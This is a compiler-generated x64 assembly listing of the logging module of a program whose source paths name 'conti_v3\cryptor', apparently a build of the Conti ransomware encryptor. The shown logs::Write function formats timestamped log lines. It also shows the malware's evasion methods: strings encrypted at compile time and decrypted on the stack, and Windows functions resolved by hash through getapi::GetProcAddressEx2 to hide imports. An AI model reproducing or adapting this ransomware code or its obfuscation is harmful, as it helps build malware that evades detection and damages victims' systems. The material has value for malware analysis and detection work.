; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_15JNBOKNOG@?$AA?$AN?$AA?6@		; `string'
PUBLIC	??_C@_1CE@MDGPDCAG@?$AA?$FL?$AA?$CF?$AA0?$AA2?$AAd?$AA?3?$AA?$CF?$AA0?$AA2?$AAd?$AA?3?$AA?$CF?$AA0?$AA2?$AAd@ ; `string'
PUBLIC	?g_CritSec@@3U_RTL_CRITICAL_SECTION@@A		; g_CritSec
PUBLIC	?g_LogHandle@@3PEAXEA				; g_LogHandle
EXTRN	__imp_GetLocalTime:PROC
?g_CritSec@@3U_RTL_CRITICAL_SECTION@@A DB 028H DUP (?)	; g_CritSec
_BSS	ENDS
;	COMDAT ??_C@_1CE@MDGPDCAG@?$AA?$FL?$AA?$CF?$AA0?$AA2?$AAd?$AA?3?$AA?$CF?$AA0?$AA2?$AAd?$AA?3?$AA?$CF?$AA0?$AA2?$AAd@
CONST	SEGMENT
??_C@_1CE@MDGPDCAG@?$AA?$FL?$AA?$CF?$AA0?$AA2?$AAd?$AA?3?$AA?$CF?$AA0?$AA2?$AAd?$AA?3?$AA?$CF?$AA0?$AA2?$AAd@ DB '['
	DB	00H, '%', 00H, '0', 00H, '2', 00H, 'd', 00H, ':', 00H, '%', 00H
	DB	'0', 00H, '2', 00H, 'd', 00H, ':', 00H, '%', 00H, '0', 00H, '2'
	DB	00H, 'd', 00H, ']', 00H, ' ', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_15JNBOKNOG@?$AA?$AN?$AA?6@
CONST	SEGMENT
??_C@_15JNBOKNOG@?$AA?$AN?$AA?6@ DB 0dH, 00H, 0aH, 00H, 00H, 00H ; `string'
	ORG $+2
?g_LogHandle@@3PEAXEA DQ ffffffffffffffffH		; g_LogHandle
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	?isDecrypted@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?decrypt@?$MetaBuffer@$0EH@$07U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<71,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
PUBLIC	?Init@logs@@YAXPEB_W@Z				; logs::Init
PUBLIC	?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z		; pwvsprintfW
PUBLIC	?pSetFilePointer@@YAKPEAXJPEAJK@Z		; pSetFilePointer
PUBLIC	?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pInitializeCriticalSection
PUBLIC	?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection
PUBLIC	?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection
PUBLIC	?Write@logs@@YAXPEB_WZZ				; logs::Write
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Init@logs@@YAXPEB_W@Z DD imagerel $LN10
	DD	imagerel $LN10+152
	DD	imagerel $unwind$?Init@logs@@YAXPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z DD imagerel $LN4
	DD	imagerel $LN4+71
	DD	imagerel $unwind$?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pSetFilePointer@@YAKPEAXJPEAJK@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pSetFilePointer@@YAKPEAXJPEAJK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?Write@logs@@YAXPEB_WZZ DD imagerel $LN149
	DD	imagerel $LN149+71
	DD	imagerel $unwind$?Write@logs@@YAXPEB_WZZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?Write@logs@@YAXPEB_WZZ DD imagerel $LN149+71
	DD	imagerel $LN149+869
	DD	imagerel $chain$2$?Write@logs@@YAXPEB_WZZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?Write@logs@@YAXPEB_WZZ DD imagerel $LN149+869
	DD	imagerel $LN149+894
	DD	imagerel $chain$3$?Write@logs@@YAXPEB_WZZ
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?Write@logs@@YAXPEB_WZZ DD 021H
	DD	imagerel $LN149
	DD	imagerel $LN149+71
	DD	imagerel $unwind$?Write@logs@@YAXPEB_WZZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?Write@logs@@YAXPEB_WZZ DD 061a21H
	DD	0132e41aH
	DD	01337408H
	DD	01346404H
	DD	imagerel $LN149
	DD	imagerel $LN149+71
	DD	imagerel $unwind$?Write@logs@@YAXPEB_WZZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Write@logs@@YAXPEB_WZZ DD 043419H
	DD	01350123H
	DD	050143015H
	DD	imagerel __GSHandlerCheck
	DD	0980H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pSetFilePointer@@YAKPEAXJPEAJK@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z DD 060f01H
	DD	07640fH
	DD	06340fH
	DD	0700b320fH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?Init@logs@@YAXPEB_W@Z DD 020601H
	DD	030027206H
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
;	COMDAT ?Write@logs@@YAXPEB_WZZ
_TEXT	SEGMENT
$T1 = 48
$T2 = 56
Args$3 = 96
dwWritten$4 = 104
st$5 = 112
TimeBuffer$6 = 128
Buffer$7 = 384
__$ArrayPad$ = 2432
Format$ = 2496
?Write@logs@@YAXPEB_WZZ PROC				; logs::Write, COMDAT

; 24   : {

$LN149:
  00000	4c 8b dc	 mov	 r11, rsp
  00003	49 89 4b 08	 mov	 QWORD PTR [r11+8], rcx
  00007	49 89 53 10	 mov	 QWORD PTR [r11+16], rdx
  0000b	4d 89 43 18	 mov	 QWORD PTR [r11+24], r8
  0000f	4d 89 4b 20	 mov	 QWORD PTR [r11+32], r9
  00013	55		 push	 rbp
  00014	53		 push	 rbx
  00015	49 8d ab 48 f7
	ff ff		 lea	 rbp, QWORD PTR [r11-2232]
  0001c	48 81 ec a8 09
	00 00		 sub	 rsp, 2472		; 000009a8H
  00023	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0002a	48 33 c4	 xor	 rax, rsp
  0002d	48 89 85 80 08
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax

; 25   : 	if (g_LogHandle != INVALID_HANDLE_VALUE) {

  00034	48 83 3d 00 00
	00 00 ff	 cmp	 QWORD PTR ?g_LogHandle@@3PEAXEA, -1 ; g_LogHandle
  0003c	48 8b d9	 mov	 rbx, rcx
  0003f	0f 84 20 03 00
	00		 je	 $LN3@Write
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00045	33 c0		 xor	 eax, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 25   : 	if (g_LogHandle != INVALID_HANDLE_VALUE) {

  00047	49 89 73 e8	 mov	 QWORD PTR [r11-24], rsi
  0004b	49 89 7b e0	 mov	 QWORD PTR [r11-32], rdi

; 26   : 
; 27   : 		va_list Args;
; 28   : 		WCHAR Buffer[1024];
; 29   : 
; 30   : 		va_start(Args, Format);

  0004f	48 8d b5 c8 08
	00 00		 lea	 rsi, QWORD PTR Format$[rbp-248]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00056	48 8d bd 80 00
	00 00		 lea	 rdi, QWORD PTR Buffer$7[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 25   : 	if (g_LogHandle != INVALID_HANDLE_VALUE) {

  0005d	4d 89 73 d8	 mov	 QWORD PTR [r11-40], r14
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00061	b9 00 08 00 00	 mov	 ecx, 2048		; 00000800H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1091 : 	pFunction = (int(WINAPI*)(LPWSTR, LPCWSTR, va_list))getapi::GetProcAddressEx2(NULL, USER32_MODULE_ID, 0x5b7a35c4, 16);

  00066	41 b8 c4 35 7a
	5b		 mov	 r8d, 1534735812		; 5b7a35c4H
  0006c	8d 50 14	 lea	 edx, QWORD PTR [rax+20]
  0006f	44 8d 48 10	 lea	 r9d, QWORD PTR [rax+16]
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00073	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1091 : 	pFunction = (int(WINAPI*)(LPWSTR, LPCWSTR, va_list))getapi::GetProcAddressEx2(NULL, USER32_MODULE_ID, 0x5b7a35c4, 16);

  00075	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1092 : 	return pFunction(Buf, Format, arglist);

  0007a	4c 8b c6	 mov	 r8, rsi
  0007d	48 8d 8d 80 00
	00 00		 lea	 rcx, QWORD PTR Buffer$7[rbp-256]
  00084	48 8b d3	 mov	 rdx, rbx
  00087	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 35   : 		va_end(Args);

  00089	45 33 f6	 xor	 r14d, r14d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1092 : 	return pFunction(Buf, Format, arglist);

  0008c	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 35   : 		va_end(Args);

  0008f	4c 89 74 24 60	 mov	 QWORD PTR Args$3[rsp], r14

; 36   : 
; 37   : 		if (Size > 0) {

  00094	85 c0		 test	 eax, eax
  00096	0f 8e b1 02 00
	00		 jle	 $LN147@Write
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0009c	44 88 74 24 30	 mov	 BYTE PTR $T1[rsp], r14b
  000a1	c6 44 24 31 2a	 mov	 BYTE PTR $T1[rsp+1], 42	; 0000002aH
  000a6	c6 44 24 32 08	 mov	 BYTE PTR $T1[rsp+2], 8
  000ab	c6 44 24 33 53	 mov	 BYTE PTR $T1[rsp+3], 83	; 00000053H
  000b0	c6 44 24 34 08	 mov	 BYTE PTR $T1[rsp+4], 8
  000b5	c6 44 24 35 08	 mov	 BYTE PTR $T1[rsp+5], 8
  000ba	c6 44 24 36 08	 mov	 BYTE PTR $T1[rsp+6], 8
  000bf	0f b6 4c 24 31	 movzx	 ecx, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  000c4	0f b6 44 24 30	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  000c9	84 c0		 test	 al, al
  000cb	75 4e		 jne	 SHORT $LN26@Write

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  000cd	41 8b fe	 mov	 edi, r14d
$LL27@Write:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000d0	0f b6 4c 3c 31	 movzx	 ecx, BYTE PTR $T1[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  000d5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  000da	83 e9 08	 sub	 ecx, 8
  000dd	6b c9 22	 imul	 ecx, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  000e0	f7 e9		 imul	 ecx
  000e2	03 d1		 add	 edx, ecx
  000e4	c1 fa 06	 sar	 edx, 6
  000e7	8b c2		 mov	 eax, edx
  000e9	c1 e8 1f	 shr	 eax, 31
  000ec	03 d0		 add	 edx, eax
  000ee	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000f1	2b c8		 sub	 ecx, eax
  000f3	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000f8	83 c1 7f	 add	 ecx, 127		; 0000007fH
  000fb	f7 e9		 imul	 ecx
  000fd	03 d1		 add	 edx, ecx
  000ff	c1 fa 06	 sar	 edx, 6
  00102	8b c2		 mov	 eax, edx
  00104	c1 e8 1f	 shr	 eax, 31
  00107	03 d0		 add	 edx, eax
  00109	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0010c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0010e	88 4c 3c 31	 mov	 BYTE PTR $T1[rsp+rdi+1], cl
  00112	48 ff c7	 inc	 rdi
  00115	48 83 ff 06	 cmp	 rdi, 6
  00119	72 b5		 jb	 SHORT $LL27@Write
$LN26@Write:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  0011b	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 40   : 			Size *= sizeof(WCHAR);

  00120	43 8d 34 00	 lea	 esi, DWORD PTR [r8+r8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00124	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  0012a	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  0012e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  00133	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CritSec@@3U_RTL_CRITICAL_SECTION@@A ; g_CritSec
  0013a	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 48   : 				GetLocalTime(&st);

  0013c	48 8d 4c 24 70	 lea	 rcx, QWORD PTR st$5[rsp]
  00141	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_GetLocalTime
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00147	44 88 74 24 38	 mov	 BYTE PTR $T2[rsp], r14b
  0014c	c6 44 24 39 3a	 mov	 BYTE PTR $T2[rsp+1], 58	; 0000003aH
  00151	c6 44 24 3a 1f	 mov	 BYTE PTR $T2[rsp+2], 31
  00156	c6 44 24 3b 23	 mov	 BYTE PTR $T2[rsp+3], 35	; 00000023H
  0015b	c6 44 24 3c 1f	 mov	 BYTE PTR $T2[rsp+4], 31
  00160	c6 44 24 3d 7a	 mov	 BYTE PTR $T2[rsp+5], 122 ; 0000007aH
  00165	c6 44 24 3e 1f	 mov	 BYTE PTR $T2[rsp+6], 31
  0016a	c6 44 24 3f 39	 mov	 BYTE PTR $T2[rsp+7], 57	; 00000039H
  0016f	c6 44 24 40 1f	 mov	 BYTE PTR $T2[rsp+8], 31
  00174	c6 44 24 41 53	 mov	 BYTE PTR $T2[rsp+9], 83	; 00000053H
  00179	c6 44 24 42 1f	 mov	 BYTE PTR $T2[rsp+10], 31
  0017e	c6 44 24 43 33	 mov	 BYTE PTR $T2[rsp+11], 51 ; 00000033H
  00183	c6 44 24 44 1f	 mov	 BYTE PTR $T2[rsp+12], 31
  00188	c6 44 24 45 23	 mov	 BYTE PTR $T2[rsp+13], 35 ; 00000023H
  0018d	c6 44 24 46 1f	 mov	 BYTE PTR $T2[rsp+14], 31
  00192	c6 44 24 47 7a	 mov	 BYTE PTR $T2[rsp+15], 122 ; 0000007aH
  00197	c6 44 24 48 1f	 mov	 BYTE PTR $T2[rsp+16], 31
  0019c	c6 44 24 49 39	 mov	 BYTE PTR $T2[rsp+17], 57 ; 00000039H
  001a1	c6 44 24 4a 1f	 mov	 BYTE PTR $T2[rsp+18], 31
  001a6	c6 44 24 4b 53	 mov	 BYTE PTR $T2[rsp+19], 83 ; 00000053H
  001ab	c6 44 24 4c 1f	 mov	 BYTE PTR $T2[rsp+20], 31
  001b0	c6 44 24 4d 33	 mov	 BYTE PTR $T2[rsp+21], 51 ; 00000033H
  001b5	c6 44 24 4e 1f	 mov	 BYTE PTR $T2[rsp+22], 31
  001ba	c6 44 24 4f 23	 mov	 BYTE PTR $T2[rsp+23], 35 ; 00000023H
  001bf	c6 44 24 50 1f	 mov	 BYTE PTR $T2[rsp+24], 31
  001c4	c6 44 24 51 7a	 mov	 BYTE PTR $T2[rsp+25], 122 ; 0000007aH
  001c9	c6 44 24 52 1f	 mov	 BYTE PTR $T2[rsp+26], 31
  001ce	c6 44 24 53 39	 mov	 BYTE PTR $T2[rsp+27], 57 ; 00000039H
  001d3	c6 44 24 54 1f	 mov	 BYTE PTR $T2[rsp+28], 31
  001d8	c6 44 24 55 53	 mov	 BYTE PTR $T2[rsp+29], 83 ; 00000053H
  001dd	c6 44 24 56 1f	 mov	 BYTE PTR $T2[rsp+30], 31
  001e2	c6 44 24 57 78	 mov	 BYTE PTR $T2[rsp+31], 120 ; 00000078H
  001e7	c6 44 24 58 1f	 mov	 BYTE PTR $T2[rsp+32], 31
  001ec	c6 44 24 59 07	 mov	 BYTE PTR $T2[rsp+33], 7
  001f1	c6 44 24 5a 1f	 mov	 BYTE PTR $T2[rsp+34], 31
  001f6	c6 44 24 5b 1f	 mov	 BYTE PTR $T2[rsp+35], 31
  001fb	c6 44 24 5c 1f	 mov	 BYTE PTR $T2[rsp+36], 31
  00200	0f b6 44 24 39	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00205	0f b6 44 24 38	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  0020a	84 c0		 test	 al, al
  0020c	75 5d		 jne	 SHORT $LN114@Write

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0020e	49 8b fe	 mov	 rdi, r14
  00211	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL115@Write:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00220	0f b6 4c 3c 39	 movzx	 ecx, BYTE PTR $T2[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  00225	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0022a	83 e9 1f	 sub	 ecx, 31
  0022d	6b c9 29	 imul	 ecx, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00230	f7 e9		 imul	 ecx
  00232	03 d1		 add	 edx, ecx
  00234	c1 fa 06	 sar	 edx, 6
  00237	8b c2		 mov	 eax, edx
  00239	c1 e8 1f	 shr	 eax, 31
  0023c	03 d0		 add	 edx, eax
  0023e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00241	2b c8		 sub	 ecx, eax
  00243	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00248	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0024b	f7 e9		 imul	 ecx
  0024d	03 d1		 add	 edx, ecx
  0024f	c1 fa 06	 sar	 edx, 6
  00252	8b c2		 mov	 eax, edx
  00254	c1 e8 1f	 shr	 eax, 31
  00257	03 d0		 add	 edx, eax
  00259	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0025c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0025e	88 4c 3c 39	 mov	 BYTE PTR $T2[rsp+rdi+1], cl
  00262	48 ff c7	 inc	 rdi
  00265	48 83 ff 24	 cmp	 rdi, 36			; 00000024H
  00269	72 b5		 jb	 SHORT $LL115@Write
$LN114@Write:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 49   : 				INT TimeSize = wsprintfW(TimeBuffer, OBFW(L"[%02d:%02d:%02d] "), st.wHour, st.wMinute, st.wSecond);

  0026b	0f b7 44 24 7c	 movzx	 eax, WORD PTR st$5[rsp+12]
  00270	48 8d 54 24 39	 lea	 rdx, QWORD PTR $T2[rsp+1]
  00275	44 0f b7 4c 24
	7a		 movzx	 r9d, WORD PTR st$5[rsp+10]
  0027b	48 8d 4d 80	 lea	 rcx, QWORD PTR TimeBuffer$6[rbp-256]
  0027f	44 0f b7 44 24
	78		 movzx	 r8d, WORD PTR st$5[rsp+8]
  00285	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00289	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_wsprintfW
  0028f	8b d8		 mov	 ebx, eax

; 50   : 
